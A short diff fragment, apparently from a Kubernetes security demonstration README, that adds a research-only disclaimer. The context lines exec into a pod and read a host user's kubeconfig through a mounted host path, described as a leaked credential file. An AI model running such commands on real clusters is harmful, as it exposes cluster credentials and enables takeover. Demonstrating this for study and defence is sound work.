@@ -23,4 +23,6 @@ kubectl exec -it nginx-pod-mount2 -n default -- bash
 # View leaked kubeconfig file
 cat /host/home/ubunt/.kube/config
 ```
+**IMPORTANT NOTICE:**
+This program (or code) is intended for research and study purposes only. Its use for any illegal activity, invasion of privacy or violation of the Terms of Service is prohibited. The author is not responsible for the consequences of any misuse of this project.
 
